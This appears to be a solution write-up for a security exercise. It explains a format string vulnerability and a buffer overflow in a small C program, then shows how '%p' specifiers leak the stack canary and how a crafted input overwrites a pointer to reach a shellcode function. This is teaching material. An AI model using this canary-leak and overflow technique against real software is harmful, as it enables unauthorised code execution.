1. The program is affected by a buffer overflow and a format string vulnerability.

The problematic lines are:

printf(data.name); // Format string vulnerability
user_input(" password", data.pass, sizeof(data)); // Buffer overflow vulnerability

Explanations and fixes are identical to the previous exercises, so they are omitted.

2. Exploiting this program is slightly harder, as we do not have any debug logging, apart
from the the address of the shellcode function. However, we do have two separate vulnerabilities.

To successfully run the shellcode, we need to provide the following input to `user_input`:

[16 arbitrary bytes] [4 bytes canary] [4 bytes, at least one non-zero] [8 bytes shellcode pointer]

However, we do not know the canary value. Luckily, we can exploit the format string vulnerability
to print stack data. You can use any format specifier you want ("%p" is a good choice as it will
print all data as hex values), as long as you correctly interpret what is being printed out.

Example (shellcode: 0x104637738)
--------------------------------

User name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x104637738 0x1 0x60 0x16b7ca9e8 0x6cb048df6b7caa50 0x16b7cacb8 0x2 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520702520 0x0 0x0 0x6cb048df 0x104637754 0x13c452eea6e10062 0x16b7cac90 password:

> Notice that there is a long sequence of 70 (p) 25 (%) 20 (space) bytes. That is our input string.
> (characters are reversed due to endianness). It is followed by two 8 bytes NULL values, which as you
> may guess are the zero-initialized password field. Further on, we have the 0x6cb048df value, which
> represents the 4 bytes `canary` and 4 bytes `authenticated` field. Since `authenticated` is initialized
> to zero, 0x6cb048df is just the canary value. With this knowledge, we can craft our malicious input.

... password: 1234567890123456\df\48\b0\6cXXXX\38\77\63\04\1
You got shell!
